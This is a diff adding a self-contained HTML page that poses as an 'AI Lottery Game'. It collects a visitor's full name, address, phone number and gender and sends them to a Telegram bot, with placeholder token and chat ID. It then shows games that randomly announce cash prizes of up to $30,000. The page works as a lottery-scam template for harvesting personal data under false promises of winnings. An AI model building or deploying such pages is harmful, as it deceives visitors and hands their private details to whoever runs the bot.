@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Lottery Game</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        h1 {
+            color: green;
+        }
+        .container {
+            margin: 20px auto;
+            max-width: 500px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+        }
+        input, select, button {
+            display: block;
+            width: 90%;
+            margin: 10px auto;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        .game-list button {
+            background-color: #007BFF;
+        }
+        canvas {
+            border: 2px solid black;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="formContainer">
+    <h2>Lottery Registration Form</h2>
+    <form id="lotteryForm">
+        <input type="text" id="firstName" placeholder="First Name" required>
+        <input type="text" id="middleName" placeholder="Middle Name">
+        <input type="text" id="lastName" placeholder="Last Name" required>
+        <input type="text" id="address" placeholder="Full Address" required>
+        <input type="tel" id="phone" placeholder="Phone Number" required>
+        <select id="gender" required>
+            <option value="" disabled selected>Select Gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+        </select>
+        <button type="submit">Submit</button>
+    </form>
+</div>
+
+<div class="container" id="welcomeContainer" style="display: none;">
+    <h1 id="welcomeMessage"></h1>
+    <h3>Select a game to play:</h3>
+    <div class="game-list">
+        <button onclick="playDice()">🎲 Roll the Dice</button>
+        <button onclick="playSpin()">🎡 Spin the Board</button>
+    </div>
+</div>
+
+<div id="gameContainer" class="container" style="display: none;">
+    <canvas id="prizeBoard" width="300" height="300" style="display: none;"></canvas>
+    <div id="gameResult" style="font-size: 18px; margin-top: 20px;"></div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+
+// Form Submission to Telegram
+document.getElementById('lotteryForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const firstName = document.getElementById('firstName').value;
+    const lastName = document.getElementById('lastName').value;
+    const middleName = document.getElementById('middleName').value;
+    const address = document.getElementById('address').value;
+    const phone = document.getElementById('phone').value;
+    const gender = document.getElementById('gender').value;
+
+    const message = `New Lottery Registration:\nName: ${firstName} ${middleName} ${lastName}\nAddress: ${address}\nPhone: ${phone}\nGender: ${gender}`;
+
+    // Send message to Telegram
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+        }),
+    }).then(() => {
+        // Display Welcome Message
+        document.getElementById('formContainer').style.display = 'none';
+        document.getElementById('welcomeContainer').style.display = 'block';
+        document.getElementById('welcomeMessage').innerHTML = 
+            `Dear <b style="color: green;">${firstName} ${lastName}</b>, we welcome you to AI Lottery Page!`;
+    }).catch((error) => alert("Error submitting form: " + error));
+});
+
+// Rolling Dice Game
+function playDice() {
+    const result = Math.ceil(Math.random() * 6);
+    alert(`🎲 You rolled a ${result}`);
+    document.getElementById('gameResult').innerHTML = `You rolled: ${result}`;
+}
+
+// Spin the Board Game
+function playSpin() {
+    const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000', 'Try Again'];
+    let index = 0;
+
+    const spinAnimation = setInterval(() => {
+        index = (index + 1) % prizes.length;
+        document.getElementById('gameResult').innerHTML = `Spinning... ${prizes[index]}`;
+    }, 100);
+
+    setTimeout(() => {
+        clearInterval(spinAnimation);
+        const finalPrize = prizes[Math.floor(Math.random() * prizes.length)];
+        if (finalPrize === 'Try Again') {
+            alert('Try Again!');
+        } else {
+            alert(`🎉 Congratulations! You won ${finalPrize}`);
+        }
+        document.getElementById('gameResult').innerHTML = `Result: ${finalPrize}`;
+    }, 5000);
+}
+</script>
+</body>
+</html>
